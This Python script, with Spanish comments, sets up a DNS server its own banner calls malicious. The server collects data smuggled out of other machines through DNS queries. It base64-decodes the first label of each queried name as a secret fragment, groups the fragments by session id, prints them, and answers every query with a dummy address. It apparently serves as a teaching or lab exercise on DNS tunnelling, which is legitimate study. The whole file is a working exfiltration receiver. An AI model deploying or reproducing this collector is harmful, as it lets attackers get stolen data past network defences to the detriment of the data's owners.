from dnslib import *
from dnslib.server import DNSServer, DNSHandler, BaseResolver, DNSLogger
import base64

# almacena las sesiones si quieremos enviar varios archivos
sesiones = {}

class ExfilResolver(BaseResolver):

    def resolve(self, request, handler):
        qname = request.q.qname # Obtenemos el nombre del dominio
        nombre = str(qname) # Lo volvemos un str

        try:

            # segmentamos el str
            partes = nombre.split('.') # Cortamos por palabras a partir del .
            fragmeto_base64 = partes[0] #Es el secreto en base64
            sesion_id = partes[1] #es el numero del id del fragmento

            fragmento = base64.b64decode(fragmeto_base64.encode()) # explicar que hace bien esto
            print(f"[+] Recibido fragmento para sesión {sesion_id}: {fragmento}")

            # Guardamos el fragmento
            if sesion_id not in sesiones:
                sesiones[sesion_id] = []
            sesiones[sesion_id].append(fragmento)

        except Exception as e:
            print(f"[-] Error procesando: {nombre} | {e}") 

        # Respondemos con una IP dummy
        reply = request.reply() #Creamos una respuesta DNS vacía en la petición
        reply.add_answer(RR # respuesta real
                         (rname=qname, # Nombre original que se consultó
                            rtype=QTYPE.A, # Tipo de registro DNS
                            rclass=1, 
                            ttl=300,
                            rdata=A("8.8.8.8"))) # ip que vamos a devolver

        return reply # Devolvemos la respuesta
    
if __name__ == "__main__" :
    resolver = ExfilResolver() # Creamos una instancia de la clase
    logger = DNSLogger(prefix=False) #Creamos un log (para ver la respuesta en consola)
    server = DNSServer(resolver, port=53, address="0.0.0.0", logger=logger) # Configuramos el servidor DNS

    print("[*] Servidor DNS malicioso escuchando en 0.0.0.0:53")
    server.start() # iniciamos el servidor DNS